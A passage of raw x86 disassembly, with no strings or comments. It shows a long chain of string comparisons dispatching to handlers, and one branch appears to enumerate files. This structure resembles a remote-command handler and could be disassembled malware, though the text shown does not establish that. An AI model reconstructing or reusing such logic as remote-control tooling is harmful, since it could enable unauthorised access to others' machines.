  40ad71:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40ad74:	ff 15 54 02 41 00    	call   *0x410254
  40ad7a:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40ad7d:	e9 c1 fc ff ff       	jmp    0x40aa43
  40ad82:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40ad85:	68 54 15 41 00       	push   $0x411554
  40ad8a:	50                   	push   %eax
  40ad8b:	ff d3                	call   *%ebx
  40ad8d:	59                   	pop    %ecx
  40ad8e:	84 c0                	test   %al,%al
  40ad90:	59                   	pop    %ecx
  40ad91:	74 2a                	je     0x40adbd
  40ad93:	33 f6                	xor    %esi,%esi
  40ad95:	6a 01                	push   $0x1
  40ad97:	56                   	push   %esi
  40ad98:	56                   	push   %esi
  40ad99:	6a 01                	push   $0x1
  40ad9b:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40ad9e:	e8 e6 64 ff ff       	call   0x401289
  40ada3:	8b c8                	mov    %eax,%ecx
  40ada5:	ff 15 58 02 41 00    	call   *0x410258
  40adab:	50                   	push   %eax
  40adac:	68 18 07 41 00       	push   $0x410718
  40adb1:	56                   	push   %esi
  40adb2:	ff 15 bc 03 41 00    	call   *0x4103bc
  40adb8:	e9 47 08 00 00       	jmp    0x40b604
  40adbd:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40adc0:	68 40 15 41 00       	push   $0x411540
  40adc5:	50                   	push   %eax
  40adc6:	ff d3                	call   *%ebx
  40adc8:	59                   	pop    %ecx
  40adc9:	84 c0                	test   %al,%al
  40adcb:	59                   	pop    %ecx
  40adcc:	74 2d                	je     0x40adfb
  40adce:	83 3d c0 5a 41 00 00 	cmpl   $0x0,0x415ac0
  40add5:	74 0a                	je     0x40ade1
  40add7:	b9 c0 5a 41 00       	mov    $0x415ac0,%ecx
  40addc:	e8 e6 73 ff ff       	call   0x4021c7
  40ade1:	6a 01                	push   $0x1
  40ade3:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40ade6:	e8 9e 64 ff ff       	call   0x401289
  40adeb:	50                   	push   %eax
  40adec:	b9 18 5b 41 00       	mov    $0x415b18,%ecx
  40adf1:	ff 15 64 02 41 00    	call   *0x410264
  40adf7:	6a 02                	push   $0x2
  40adf9:	eb 13                	jmp    0x40ae0e
  40adfb:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40adfe:	68 38 15 41 00       	push   $0x411538
  40ae03:	50                   	push   %eax
  40ae04:	ff d3                	call   *%ebx
  40ae06:	59                   	pop    %ecx
  40ae07:	84 c0                	test   %al,%al
  40ae09:	59                   	pop    %ecx
  40ae0a:	74 20                	je     0x40ae2c
  40ae0c:	6a 01                	push   $0x1
  40ae0e:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40ae11:	e8 73 64 ff ff       	call   0x401289
  40ae16:	8b c8                	mov    %eax,%ecx
  40ae18:	ff 15 58 02 41 00    	call   *0x410258
  40ae1e:	50                   	push   %eax
  40ae1f:	ff d7                	call   *%edi
  40ae21:	50                   	push   %eax
  40ae22:	e8 2e 2c 00 00       	call   0x40da55
  40ae27:	e9 d2 fd ff ff       	jmp    0x40abfe
  40ae2c:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40ae2f:	68 2c 15 41 00       	push   $0x41152c
  40ae34:	50                   	push   %eax
  40ae35:	ff d3                	call   *%ebx
  40ae37:	59                   	pop    %ecx
  40ae38:	84 c0                	test   %al,%al
  40ae3a:	59                   	pop    %ecx
  40ae3b:	74 0f                	je     0x40ae4c
  40ae3d:	b9 c0 5a 41 00       	mov    $0x415ac0,%ecx
  40ae42:	e8 80 73 ff ff       	call   0x4021c7
  40ae47:	e9 b8 07 00 00       	jmp    0x40b604
  40ae4c:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40ae4f:	68 20 15 41 00       	push   $0x411520
  40ae54:	50                   	push   %eax
  40ae55:	ff d3                	call   *%ebx
  40ae57:	59                   	pop    %ecx
  40ae58:	84 c0                	test   %al,%al
  40ae5a:	59                   	pop    %ecx
  40ae5b:	74 4b                	je     0x40aea8
  40ae5d:	80 65 d4 00          	andb   $0x0,-0x2c(%ebp)
  40ae61:	33 c0                	xor    %eax,%eax
  40ae63:	8d 7d d5             	lea    -0x2b(%ebp),%edi
  40ae66:	ab                   	stos   %eax,%es:(%edi)
  40ae67:	ab                   	stos   %eax,%es:(%edi)
  40ae68:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40ae6b:	50                   	push   %eax
  40ae6c:	ff 15 04 04 41 00    	call   *0x410404
  40ae72:	83 ec 10             	sub    $0x10,%esp
  40ae75:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40ae78:	8b fc                	mov    %esp,%edi
  40ae7a:	50                   	push   %eax
  40ae7b:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40ae7e:	56                   	push   %esi
  40ae7f:	50                   	push   %eax
  40ae80:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40ae83:	50                   	push   %eax
  40ae84:	e8 8b 4d 00 00       	call   0x40fc14
  40ae89:	83 c4 0c             	add    $0xc,%esp
  40ae8c:	50                   	push   %eax
  40ae8d:	57                   	push   %edi
  40ae8e:	e8 8d 4d 00 00       	call   0x40fc20
  40ae93:	83 c4 0c             	add    $0xc,%esp
  40ae96:	b9 30 5a 41 00       	mov    $0x415a30,%ecx
  40ae9b:	e8 f8 72 ff ff       	call   0x402198
  40aea0:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40aea3:	e9 19 fd ff ff       	jmp    0x40abc1
  40aea8:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40aeab:	68 10 15 41 00       	push   $0x411510
  40aeb0:	50                   	push   %eax
  40aeb1:	ff d3                	call   *%ebx
  40aeb3:	59                   	pop    %ecx
  40aeb4:	84 c0                	test   %al,%al
  40aeb6:	59                   	pop    %ecx
  40aeb7:	74 0f                	je     0x40aec8
  40aeb9:	b9 c0 56 41 00       	mov    $0x4156c0,%ecx
  40aebe:	e8 9c 93 ff ff       	call   0x40425f
  40aec3:	e9 3c 07 00 00       	jmp    0x40b604
  40aec8:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40aecb:	68 00 15 41 00       	push   $0x411500
  40aed0:	50                   	push   %eax
  40aed1:	ff d3                	call   *%ebx
  40aed3:	59                   	pop    %ecx
  40aed4:	84 c0                	test   %al,%al
  40aed6:	59                   	pop    %ecx
  40aed7:	74 0f                	je     0x40aee8
  40aed9:	b9 c0 56 41 00       	mov    $0x4156c0,%ecx
  40aede:	e8 53 94 ff ff       	call   0x404336
  40aee3:	e9 1c 07 00 00       	jmp    0x40b604
  40aee8:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40aeeb:	68 f0 14 41 00       	push   $0x4114f0
  40aef0:	50                   	push   %eax
  40aef1:	ff d3                	call   *%ebx
  40aef3:	59                   	pop    %ecx
  40aef4:	84 c0                	test   %al,%al
  40aef6:	59                   	pop    %ecx
  40aef7:	74 27                	je     0x40af20
  40aef9:	6a 01                	push   $0x1
  40aefb:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40aefe:	e8 86 63 ff ff       	call   0x401289
  40af03:	50                   	push   %eax
  40af04:	b9 30 57 41 00       	mov    $0x415730,%ecx
  40af09:	ff 15 64 02 41 00    	call   *0x410264
  40af0f:	6a 00                	push   $0x0
  40af11:	b9 c0 56 41 00       	mov    $0x4156c0,%ecx
  40af16:	e8 7f 8e ff ff       	call   0x403d9a
  40af1b:	e9 e4 06 00 00       	jmp    0x40b604
  40af20:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40af23:	68 dc 14 41 00       	push   $0x4114dc
  40af28:	50                   	push   %eax
  40af29:	ff d3                	call   *%ebx
  40af2b:	59                   	pop    %ecx
  40af2c:	84 c0                	test   %al,%al
  40af2e:	59                   	pop    %ecx
  40af2f:	74 2e                	je     0x40af5f
  40af31:	6a 01                	push   $0x1
  40af33:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40af36:	c6 05 70 5a 41 00 01 	movb   $0x1,0x415a70
  40af3d:	e8 47 63 ff ff       	call   0x401289
  40af42:	50                   	push   %eax
  40af43:	b9 30 57 41 00       	mov    $0x415730,%ecx
  40af48:	ff 15 64 02 41 00    	call   *0x410264
  40af4e:	6a 01                	push   $0x1
  40af50:	b9 c0 56 41 00       	mov    $0x4156c0,%ecx
  40af55:	e8 40 8e ff ff       	call   0x403d9a
  40af5a:	e9 9e 06 00 00       	jmp    0x40b5fd
  40af5f:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40af62:	68 cc 14 41 00       	push   $0x4114cc
  40af67:	50                   	push   %eax
  40af68:	ff d3                	call   *%ebx
  40af6a:	59                   	pop    %ecx
  40af6b:	84 c0                	test   %al,%al
  40af6d:	59                   	pop    %ecx
  40af6e:	74 0f                	je     0x40af7f
  40af70:	b9 c0 56 41 00       	mov    $0x4156c0,%ecx
  40af75:	e8 92 a2 ff ff       	call   0x40520c
  40af7a:	e9 85 06 00 00       	jmp    0x40b604
  40af7f:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40af82:	68 c0 14 41 00       	push   $0x4114c0
  40af87:	50                   	push   %eax
  40af88:	ff d3                	call   *%ebx
  40af8a:	59                   	pop    %ecx
  40af8b:	84 c0                	test   %al,%al
  40af8d:	59                   	pop    %ecx
  40af8e:	74 1b                	je     0x40afab
  40af90:	80 3d 6a 57 41 00 00 	cmpb   $0x0,0x41576a
  40af97:	0f 85 67 06 00 00    	jne    0x40b604
  40af9d:	6a 00                	push   $0x0
  40af9f:	6a 00                	push   $0x0
  40afa1:	e8 c6 af ff ff       	call   0x405f6c
  40afa6:	e9 53 fc ff ff       	jmp    0x40abfe
  40afab:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40afae:	68 b4 14 41 00       	push   $0x4114b4
  40afb3:	50                   	push   %eax
  40afb4:	ff d3                	call   *%ebx
  40afb6:	59                   	pop    %ecx
  40afb7:	84 c0                	test   %al,%al
  40afb9:	59                   	pop    %ecx
  40afba:	0f 84 5c 01 00 00    	je     0x40b11c
  40afc0:	68 b0 14 41 00       	push   $0x4114b0
  40afc5:	8d 45 8c             	lea    -0x74(%ebp),%eax
  40afc8:	68 08 5b 41 00       	push   $0x415b08
  40afcd:	50                   	push   %eax
  40afce:	e8 4d 4c 00 00       	call   0x40fc20
  40afd3:	83 c4 0c             	add    $0xc,%esp
  40afd6:	8d 85 34 fd ff ff    	lea    -0x2cc(%ebp),%eax
  40afdc:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  40afdf:	50                   	push   %eax
  40afe0:	ff 15 58 02 41 00    	call   *0x410258
  40afe6:	50                   	push   %eax
  40afe7:	ff 15 34 01 41 00    	call   *0x410134
  40afed:	89 45 b0             	mov    %eax,-0x50(%ebp)
  40aff0:	8d 45 0b             	lea    0xb(%ebp),%eax
  40aff3:	50                   	push   %eax
  40aff4:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40aff7:	ff 15 50 02 41 00    	call   *0x410250
  40affd:	8d 45 cf             	lea    -0x31(%ebp),%eax
  40b000:	68 d8 08 41 00       	push   $0x4108d8
  40b005:	50                   	push   %eax
  40b006:	8d 85 60 fd ff ff    	lea    -0x2a0(%ebp),%eax
  40b00c:	50                   	push   %eax
  40b00d:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40b010:	ff 15 4c 02 41 00    	call   *0x41024c
  40b016:	50                   	push   %eax
  40b017:	ff 15 a4 02 41 00    	call   *0x4102a4
  40b01d:	59                   	pop    %ecx
  40b01e:	88 45 0b             	mov    %al,0xb(%ebp)
  40b021:	59                   	pop    %ecx
  40b022:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40b025:	ff 15 54 02 41 00    	call   *0x410254
  40b02b:	80 7d 0b 00          	cmpb   $0x0,0xb(%ebp)
  40b02f:	74 2c                	je     0x40b05d
  40b031:	8d 45 0b             	lea    0xb(%ebp),%eax
  40b034:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40b037:	50                   	push   %eax
  40b038:	8d 85 34 fd ff ff    	lea    -0x2cc(%ebp),%eax
  40b03e:	68 40 01 00 00       	push   $0x140
  40b043:	50                   	push   %eax
  40b044:	ff 15 70 02 41 00    	call   *0x410270
  40b04a:	50                   	push   %eax
  40b04b:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40b04e:	ff 15 64 02 41 00    	call   *0x410264
  40b054:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40b057:	ff 15 54 02 41 00    	call   *0x410254
  40b05d:	8d 85 34 fd ff ff    	lea    -0x2cc(%ebp),%eax
  40b063:	50                   	push   %eax
  40b064:	ff 75 b0             	push   -0x50(%ebp)
  40b067:	ff 15 38 01 41 00    	call   *0x410138
  40b06d:	85 c0                	test   %eax,%eax
  40b06f:	74 5c                	je     0x40b0cd
  40b071:	8d 45 cf             	lea    -0x31(%ebp),%eax
  40b074:	68 1c 0c 41 00       	push   $0x410c1c
  40b079:	50                   	push   %eax
  40b07a:	8d 85 60 fd ff ff    	lea    -0x2a0(%ebp),%eax
  40b080:	50                   	push   %eax
  40b081:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40b084:	ff 15 4c 02 41 00    	call   *0x41024c
  40b08a:	50                   	push   %eax
  40b08b:	ff 15 a4 02 41 00    	call   *0x4102a4
  40b091:	59                   	pop    %ecx
  40b092:	88 45 0b             	mov    %al,0xb(%ebp)
  40b095:	59                   	pop    %ecx
  40b096:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40b099:	ff 15 54 02 41 00    	call   *0x410254
  40b09f:	80 7d 0b 00          	cmpb   $0x0,0xb(%ebp)
  40b0a3:	74 b8                	je     0x40b05d
  40b0a5:	8d 45 af             	lea    -0x51(%ebp),%eax
  40b0a8:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  40b0ab:	50                   	push   %eax
  40b0ac:	8d 85 34 fd ff ff    	lea    -0x2cc(%ebp),%eax
  40b0b2:	68 40 01 00 00       	push   $0x140
  40b0b7:	50                   	push   %eax
  40b0b8:	ff 15 70 02 41 00    	call   *0x410270
  40b0be:	50                   	push   %eax
  40b0bf:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40b0c2:	ff 15 94 02 41 00    	call   *0x410294
  40b0c8:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  40b0cb:	eb 8a                	jmp    0x40b057
  40b0cd:	83 ec 10             	sub    $0x10,%esp
  40b0d0:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40b0d3:	8b d4                	mov    %esp,%edx
  40b0d5:	50                   	push   %eax
  40b0d6:	56                   	push   %esi
  40b0d7:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40b0da:	68 a4 14 41 00       	push   $0x4114a4
  40b0df:	50                   	push   %eax
  40b0e0:	89 55 08             	mov    %edx,0x8(%ebp)
  40b0e3:	e8 32 4b 00 00       	call   0x40fc1a
  40b0e8:	83 c4 0c             	add    $0xc,%esp
  40b0eb:	50                   	push   %eax
  40b0ec:	8b 45 08             	mov    0x8(%ebp),%eax
  40b0ef:	50                   	push   %eax
  40b0f0:	e8 1f 4b 00 00       	call   0x40fc14
  40b0f5:	83 c4 0c             	add    $0xc,%esp
  40b0f8:	b9 30 5a 41 00       	mov    $0x415a30,%ecx
  40b0fd:	e8 96 70 ff ff       	call   0x402198
  40b102:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40b105:	ff 15 54 02 41 00    	call   *0x410254
  40b10b:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40b10e:	ff 15 54 02 41 00    	call   *0x410254
  40b114:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  40b117:	e9 27 f9 ff ff       	jmp    0x40aa43
  40b11c:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40b11f:	68 98 14 41 00       	push   $0x411498
  40b124:	50                   	push   %eax
  40b125:	ff d3                	call   *%ebx
  40b127:	59                   	pop    %ecx
  40b128:	84 c0                	test   %al,%al
  40b12a:	59                   	pop    %ecx
  40b12b:	0f 84 98 02 00 00    	je     0x40b3c9
  40b131:	6a 02                	push   $0x2
  40b133:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b136:	e8 4e 61 ff ff       	call   0x401289
  40b13b:	50                   	push   %eax
  40b13c:	68 cc 08 41 00       	push   $0x4108cc
  40b141:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40b144:	68 08 5b 41 00       	push   $0x415b08
  40b149:	50                   	push   %eax
  40b14a:	e8 d1 4a 00 00       	call   0x40fc20
  40b14f:	83 c4 0c             	add    $0xc,%esp
  40b152:	50                   	push   %eax
  40b153:	8d 45 8c             	lea    -0x74(%ebp),%eax
  40b156:	50                   	push   %eax
  40b157:	e8 b8 4a 00 00       	call   0x40fc14
  40b15c:	83 c4 0c             	add    $0xc,%esp
  40b15f:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40b162:	ff 15 54 02 41 00    	call   *0x410254
  40b168:	6a 01                	push   $0x1
  40b16a:	6a 24                	push   $0x24
  40b16c:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  40b16f:	ff 15 58 02 41 00    	call   *0x410258
  40b175:	50                   	push   %eax
  40b176:	8d 8d 74 fe ff ff    	lea    -0x18c(%ebp),%ecx
  40b17c:	ff 15 f4 02 41 00    	call   *0x4102f4
  40b182:	8d 8d 74 fe ff ff    	lea    -0x18c(%ebp),%ecx
  40b188:	ff 15 f0 02 41 00    	call   *0x4102f0
  40b18e:	84 c0                	test   %al,%al
  40b190:	0f 84 1f 02 00 00    	je     0x40b3b5
  40b196:	8d 45 0b             	lea    0xb(%ebp),%eax
  40b199:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40b19c:	50                   	push   %eax
  40b19d:	ff 15 50 02 41 00    	call   *0x410250
  40b1a3:	8d 45 b4             	lea    -0x4c(%ebp),%eax
  40b1a6:	8d 8d 74 fe ff ff    	lea    -0x18c(%ebp),%ecx
  40b1ac:	50                   	push   %eax
  40b1ad:	ff 15 ec 02 41 00    	call   *0x4102ec
  40b1b3:	6a 06                	push   $0x6
  40b1b5:	8b f0                	mov    %eax,%esi
  40b1b7:	59                   	pop    %ecx
  40b1b8:	8d bd 54 ff ff ff    	lea    -0xac(%ebp),%edi
  40b1be:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40b1c0:	8d 8d 54 ff ff ff    	lea    -0xac(%ebp),%ecx
  40b1c6:	e8 bd a0 ff ff       	call   0x405288
  40b1cb:	50                   	push   %eax
  40b1cc:	e8 fb 4a 00 00       	call   0x40fccc
  40b1d1:	59                   	pop    %ecx
  40b1d2:	8b f8                	mov    %eax,%edi
  40b1d4:	6a 00                	push   $0x0
  40b1d6:	6a 00                	push   $0x0
  40b1d8:	8d 8d 74 fe ff ff    	lea    -0x18c(%ebp),%ecx
  40b1de:	ff 15 e8 02 41 00    	call   *0x4102e8
  40b1e4:	8d 8d 54 ff ff ff    	lea    -0xac(%ebp),%ecx
  40b1ea:	e8 99 a0 ff ff       	call   0x405288
  40b1ef:	50                   	push   %eax
  40b1f0:	57                   	push   %edi
  40b1f1:	8d 8d 74 fe ff ff    	lea    -0x18c(%ebp),%ecx
  40b1f7:	ff 15 e4 02 41 00    	call   *0x4102e4
  40b1fd:	8d 8d 74 fe ff ff    	lea    -0x18c(%ebp),%ecx
  40b203:	ff 15 e0 02 41 00    	call   *0x4102e0
  40b209:	6a 1b                	push   $0x1b
  40b20b:	b9 40 59 41 00       	mov    $0x415940,%ecx
  40b210:	e8 74 60 ff ff       	call   0x401289
  40b215:	8b c8                	mov    %eax,%ecx
  40b217:	ff 15 34 02 41 00    	call   *0x410234
  40b21d:	80 38 01             	cmpb   $0x1,(%eax)
  40b220:	75 4d                	jne    0x40b26f
  40b222:	be 50 59 41 00       	mov    $0x415950,%esi
  40b227:	8b ce                	mov    %esi,%ecx
  40b229:	ff 15 90 02 41 00    	call   *0x410290
  40b22f:	50                   	push   %eax
  40b230:	8b ce                	mov    %esi,%ecx
  40b232:	ff 15 34 02 41 00    	call   *0x410234
  40b238:	50                   	push   %eax
  40b239:	8d 8d 28 f9 ff ff    	lea    -0x6d8(%ebp),%ecx
  40b23f:	e8 a7 76 ff ff       	call   0x4028eb
  40b244:	8d 8d 54 ff ff ff    	lea    -0xac(%ebp),%ecx
  40b24a:	e8 39 a0 ff ff       	call   0x405288
  40b24f:	50                   	push   %eax
  40b250:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40b253:	57                   	push   %edi
  40b254:	50                   	push   %eax
  40b255:	8d 8d 28 f9 ff ff    	lea    -0x6d8(%ebp),%ecx
  40b25b:	e8 ca 77 ff ff       	call   0x402a2a
  40b260:	50                   	push   %eax
  40b261:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40b264:	ff 15 64 02 41 00    	call   *0x410264
  40b26a:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40b26d:	eb 27                	jmp    0x40b296
  40b26f:	8d 45 0b             	lea    0xb(%ebp),%eax
  40b272:	8d 8d 54 ff ff ff    	lea    -0xac(%ebp),%ecx
  40b278:	50                   	push   %eax
  40b279:	e8 0a a0 ff ff       	call   0x405288
  40b27e:	50                   	push   %eax
  40b27f:	57                   	push   %edi
  40b280:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40b283:	ff 15 70 02 41 00    	call   *0x410270
  40b289:	50                   	push   %eax
  40b28a:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40b28d:	ff 15 64 02 41 00    	call   *0x410264
  40b293:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40b296:	ff 15 54 02 41 00    	call   *0x410254
  40b29c:	57                   	push   %edi
  40b29d:	e8 8a 49 00 00       	call   0x40fc2c
  40b2a2:	59                   	pop    %ecx
  40b2a3:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40b2a6:	6a 01                	push   $0x1
  40b2a8:	be 68 52 41 00       	mov    $0x415268,%esi
  40b2ad:	83 ec 10             	sub    $0x10,%esp
  40b2b0:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b2b3:	8b fc                	mov    %esp,%edi
  40b2b5:	50                   	push   %eax
  40b2b6:	56                   	push   %esi
  40b2b7:	6a 03                	push   $0x3
  40b2b9:	e8 cb 5f ff ff       	call   0x401289
  40b2be:	50                   	push   %eax
  40b2bf:	56                   	push   %esi
  40b2c0:	6a 01                	push   $0x1
  40b2c2:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b2c5:	e8 bf 5f ff ff       	call   0x401289
  40b2ca:	50                   	push   %eax
  40b2cb:	56                   	push   %esi
  40b2cc:	6a 02                	push   $0x2
  40b2ce:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b2d1:	e8 b3 5f ff ff       	call   0x401289
  40b2d6:	50                   	push   %eax
  40b2d7:	56                   	push   %esi
  40b2d8:	8d 85 44 ff ff ff    	lea    -0xbc(%ebp),%eax
  40b2de:	68 88 14 41 00       	push   $0x411488
  40b2e3:	50                   	push   %eax
  40b2e4:	e8 31 49 00 00       	call   0x40fc1a
  40b2e9:	83 c4 0c             	add    $0xc,%esp
  40b2ec:	50                   	push   %eax
  40b2ed:	8d 85 34 ff ff ff    	lea    -0xcc(%ebp),%eax
  40b2f3:	50                   	push   %eax
  40b2f4:	e8 1b 49 00 00       	call   0x40fc14
  40b2f9:	83 c4 0c             	add    $0xc,%esp
  40b2fc:	50                   	push   %eax
  40b2fd:	8d 85 24 ff ff ff    	lea    -0xdc(%ebp),%eax
  40b303:	50                   	push   %eax
  40b304:	e8 0b 49 00 00       	call   0x40fc14
  40b309:	83 c4 0c             	add    $0xc,%esp
  40b30c:	50                   	push   %eax
  40b30d:	8d 85 6c ff ff ff    	lea    -0x94(%ebp),%eax
  40b313:	50                   	push   %eax
  40b314:	e8 fb 48 00 00       	call   0x40fc14
  40b319:	83 c4 0c             	add    $0xc,%esp
  40b31c:	50                   	push   %eax
  40b31d:	8d 85 7c ff ff ff    	lea    -0x84(%ebp),%eax
  40b323:	50                   	push   %eax
  40b324:	e8 eb 48 00 00       	call   0x40fc14
  40b329:	83 c4 0c             	add    $0xc,%esp
  40b32c:	50                   	push   %eax
  40b32d:	8d 45 9c             	lea    -0x64(%ebp),%eax
  40b330:	50                   	push   %eax
  40b331:	e8 de 48 00 00       	call   0x40fc14
  40b336:	83 c4 0c             	add    $0xc,%esp
  40b339:	50                   	push   %eax
  40b33a:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40b33d:	50                   	push   %eax
  40b33e:	e8 d1 48 00 00       	call   0x40fc14
  40b343:	83 c4 0c             	add    $0xc,%esp
  40b346:	50                   	push   %eax
  40b347:	57                   	push   %edi
  40b348:	e8 c7 48 00 00       	call   0x40fc14
  40b34d:	83 c4 0c             	add    $0xc,%esp
  40b350:	e8 9a 72 ff ff       	call   0x4025ef
  40b355:	83 c4 14             	add    $0x14,%esp
  40b358:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40b35b:	ff 15 54 02 41 00    	call   *0x410254
  40b361:	8d 4d 9c             	lea    -0x64(%ebp),%ecx
  40b364:	ff 15 54 02 41 00    	call   *0x410254
  40b36a:	8d 8d 7c ff ff ff    	lea    -0x84(%ebp),%ecx
  40b370:	ff 15 54 02 41 00    	call   *0x410254
  40b376:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  40b37c:	ff 15 54 02 41 00    	call   *0x410254
  40b382:	8d 8d 24 ff ff ff    	lea    -0xdc(%ebp),%ecx
  40b388:	ff 15 54 02 41 00    	call   *0x410254
  40b38e:	8d 8d 34 ff ff ff    	lea    -0xcc(%ebp),%ecx
  40b394:	ff 15 54 02 41 00    	call   *0x410254
  40b39a:	8d 8d 44 ff ff ff    	lea    -0xbc(%ebp),%ecx
  40b3a0:	ff 15 54 02 41 00    	call   *0x410254
  40b3a6:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40b3a9:	ff 15 54 02 41 00    	call   *0x410254
  40b3af:	8b 3d 9c 03 41 00    	mov    0x41039c,%edi
  40b3b5:	8d 8d 74 fe ff ff    	lea    -0x18c(%ebp),%ecx
  40b3bb:	ff 15 dc 02 41 00    	call   *0x4102dc
  40b3c1:	8d 4d 8c             	lea    -0x74(%ebp),%ecx
  40b3c4:	e9 7a f6 ff ff       	jmp    0x40aa43
  40b3c9:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40b3cc:	68 0c 06 41 00       	push   $0x41060c
  40b3d1:	50                   	push   %eax
  40b3d2:	ff d3                	call   *%ebx
  40b3d4:	59                   	pop    %ecx
  40b3d5:	84 c0                	test   %al,%al
  40b3d7:	59                   	pop    %ecx
  40b3d8:	0f 84 cd 00 00 00    	je     0x40b4ab
  40b3de:	6a 01                	push   $0x1
  40b3e0:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  40b3e3:	e8 a1 5e ff ff       	call   0x401289
  40b3e8:	50                   	push   %eax
  40b3e9:	b9 f0 51 41 00       	mov    $0x4151f0,%ecx
  40b3ee:	ff 15 64 02 41 00    	call   *0x410264
  40b3f4:	b9 00 52 41 00       	mov    $0x415200,%ecx
  40b3f9:	e8 0b 6d ff ff       	call   0x402109
  40b3fe:	83 ec 10             	sub    $0x10,%esp
  40b401:	be 78 52 41 00       	mov    $0x415278,%esi
  40b406:	8b fc                	mov    %esp,%edi
  40b408:	b9 00 52 41 00       	mov    $0x415200,%ecx
  40b40d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40b40e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40b40f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40b410:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40b411:	e8 52 6d ff ff       	call   0x402168
  40b416:	80 3d 40 52 41 00 00 	cmpb   $0x0,0x415240
  40b41d:	74 39                	je     0x40b458
  40b41f:	83 ec 10             	sub    $0x10,%esp
  40b422:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40b425:	8b f4                	mov    %esp,%esi
  40b427:	68 f0 51 41 00       	push   $0x4151f0
  40b42c:	68 68 52 41 00       	push   $0x415268
  40b431:	68 0c 06 41 00       	push   $0x41060c
  40b436:	50                   	push   %eax
  40b437:	e8 de 47 00 00       	call   0x40fc1a
  40b43c:	83 c4 0c             	add    $0xc,%esp
  40b43f:	50                   	push   %eax
  40b440:	56                   	push   %esi
  40b441:	e8 ce 47 00 00       	call   0x40fc14
  40b446:	83 c4 0c             	add    $0xc,%esp
  40b449:	b9 00 52 41 00       	mov    $0x415200,%ecx
  40b44e:	e8 45 6d ff ff       	call   0x402198
  40b453:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40b456:	eb 37                	jmp    0x40b48f
  40b458:	83 ec 10             	sub    $0x10,%esp
  40b45b:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40b45e:	8b f4                	mov    %esp,%esi
  40b460:	68 f0 51 41 00       	push   $0x4151f0
  40b465:	68 68 52 41 00       	push   $0x415268
  40b46a:	68 7c 14 41 00       	push   $0x41147c
  40b46f:	50                   	push   %eax
  40b470:	e8 a5 47 00 00       	call   0x40fc1a
  40b475:	83 c4 0c             	add    $0xc,%esp
  40b478:	50                   	push   %eax
  40b479:	56                   	push   %esi
  40b47a:	e8 95 47 00 00       	call   0x40fc14
  40b47f:	83 c4 0c             	add    $0xc,%esp
  40b482:	b9 00 52 41 00       	mov    $0x415200,%ecx
  40b487:	e8 0c 6d ff ff       	call   0x402198
  40b48c:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40b48f:	ff 15 54 02 41 00    	call   *0x410254
  40b495:	6a 00                	push   $0x0
  40b497:	68 be 1c 40 00       	push   $0x401cbe
